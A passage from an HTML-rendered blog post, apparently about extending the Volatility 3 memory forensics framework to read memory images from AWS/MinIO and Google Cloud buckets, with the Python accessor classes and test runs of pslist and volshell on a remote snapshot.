242)">.</span><span class="token plain">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            context</span><span class="token operator">=</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> config_path</span><span class="token operator">=</span><span class="token plain">config_path</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> name</span><span class="token operator">=</span><span class="token plain">name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> metadata</span><span class="token operator">=</span><span class="token plain">metadata</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Cloud.AWS"</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"pdbreader.FileLayer.location"</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_accessor </span><span class="token operator">=</span><span class="token plain"> resources</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">S3ResourceAccessor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"Cloud.Google"</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"pdbreader.FileLayer.location"</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_accessor </span><span class="token operator">=</span><span class="token plain"> resources</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">GCResourceAccessor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">_accessor </span><span class="token operator">=</span><span class="token plain"> resources</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ResourceAccessor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then, we define our custom resource accessors, the current accessors added are supporting AWS/Minio and Google Cloud buckets. Notice the use of s3fs<sup><a href="https://forensicxlab.github.io/blog/vols3#user-content-fn-2-a3ad40" id="user-content-fnref-2-a3ad40" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup> and gcsfs<sup><a href="https://forensicxlab.github.io/blog/vols3#user-content-fn-3-a3ad40" id="user-content-fnref-3-a3ad40" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> libraries.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> s3fs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> gcsfs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">S3ResourceAccessor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">object</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s3 </span><span class="token operator">=</span><span class="token plain"> s3fs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">S3FileSystem</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"rb"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">class</span><span class="token plain"> </span><span class="token class-name">GCResourceAccessor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">object</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">__init__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> interfaces</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ContextInterface</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s3 </span><span class="token operator">=</span><span class="token plain"> gcsfs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">GCSFileSystem</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">project</span><span class="token operator">=</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'Cloud.Google.project_id'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> token</span><span class="token operator">=</span><span class="token plain">context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'Cloud.Google.application_credentials'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"rb"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s3</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> mode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="testing">Testing<a href="https://forensicxlab.github.io/blog/vols3#testing" class="hash-link" aria-label="Direct link to Testing" title="Direct link to Testing">‚Äã</a></h3>
<p>It is now time to test the modified framework. Memory images between 1 and 8 gb were used for those tests.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="on-premise-minio">On-Premise MIN.IO<a href="https://forensicxlab.github.io/blog/vols3#on-premise-minio" class="hash-link" aria-label="Direct link to On-Premise MIN.IO" title="Direct link to On-Premise MIN.IO">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_ENDPOINT_URL</span><span class="token operator">=</span><span class="token plain">http://127.0.0.1:9000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_ACCESS_KEY_ID</span><span class="token operator">=</span><span class="token plain">user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_SECRET_ACCESS_KEY</span><span class="token operator">=</span><span class="token plain">password</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s3</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> s3://20acf5e8-ab93-42ff-b87a-15065da1016c/Snapshot6.vmem windows.pslist </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--dump</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--pid</span><span class="token plain"> </span><span class="token number">244</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.4</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  </span><span class="token number">100.00</span><span class="token plain">		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	</span><span class="token environment constant" style="color:rgb(189, 147, 249)">PPID</span><span class="token plain">	ImageFileName	Offset</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">V</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">244</span><span class="token plain">	</span><span class="token number">4</span><span class="token plain">	smss.exe	0xfa8002c33b30	</span><span class="token number">2</span><span class="token plain">	</span><span class="token number">29</span><span class="token plain">	N/A	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:43.000000 	N/A	pid.244.0x48080000.dmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="aws-remote-s3-bucket-using-volshell">AWS remote s3 bucket using volshell<a href="https://forensicxlab.github.io/blog/vols3#aws-remote-s3-bucket-using-volshell" class="hash-link" aria-label="Direct link to AWS remote s3 bucket using volshell" title="Direct link to AWS remote s3 bucket using volshell">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_ENDPOINT_URL</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">""</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)"># no endpoint url will point to aws by default</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_ACCESS_KEY_ID</span><span class="token operator">=</span><span class="token plain">REDACTED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">AWS_SECRET_ACCESS_KEY</span><span class="token operator">=</span><span class="token plain">REDACTED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª volshell </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-s3</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> s3://20acf5e8-ab93-42ff-b87a-15065da1016c/Snapshot6.vmem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-w</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volshell </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token number">2.5</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Readline imported successfully	PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Call help</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> to see available functions</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Volshell mode        </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> Windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Current Layer        </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> layer_name</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Current Symbol Table </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> symbol_table_name1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Current Kernel Name  </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">layer_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token plain"> from volatility3.plugins.windows </span><span class="token function" style="color:rgb(80, 250, 123)">import</span><span class="token plain"> pslist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">layer_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token plain"> pslist.PsList.get_requirements</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">layer_name</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span class="token plain"> display_plugin_output</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pslist.PsList, kernel </span><span class="token operator">=</span><span class="token plain"> self.config</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">'kernel'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ID	</span><span class="token environment constant" style="color:rgb(189, 147, 249)">PPID</span><span class="token plain">	ImageFileName	Offset</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">V</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">4</span><span class="token plain">	</span><span class="token number">0</span><span class="token plain">	System	0xfa80024b3890	</span><span class="token number">83</span><span class="token plain">	</span><span class="token number">519</span><span class="token plain">	N/A	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:43.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">244</span><span class="token plain">	</span><span class="token number">4</span><span class="token plain">	smss.exe	0xfa8002c33b30	</span><span class="token number">2</span><span class="token plain">	</span><span class="token number">29</span><span class="token plain">	N/A	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:43.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">332</span><span class="token plain">	</span><span class="token number">324</span><span class="token plain">	csrss.exe	0xfa8002e79b30	</span><span class="token number">9</span><span class="token plain">	</span><span class="token number">562</span><span class="token plain">	</span><span class="token number">0</span><span class="token plain">	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:49.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">384</span><span class="token plain">	</span><span class="token number">376</span><span class="token plain">	csrss.exe	0xfa8003a0f8a0	</span><span class="token number">10</span><span class="token plain">	</span><span class="token number">171</span><span class="token plain">	</span><span class="token number">1</span><span class="token plain">	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:50.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">392</span><span class="token plain">	</span><span class="token number">324</span><span class="token plain">	wininit.exe	0xfa8003a12060	</span><span class="token number">5</span><span class="token plain">	</span><span class="token number">80</span><span class="token plain">	</span><span class="token number">0</span><span class="token plain">	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:50.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">428</span><span class="token plain">	</span><span class="token number">376</span><span class="token plain">	winlogon.exe	0xfa8003a31060	</span><span class="token number">5</span><span class="token plain">	</span><span class="token number">120</span><span class="token plain">	</span><span class="token number">1</span><span class="token plain">	False	</span><span class="token number">2020</span><span class="token plain">-12-27 06:18:50.000000 	N/A	Disabled</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 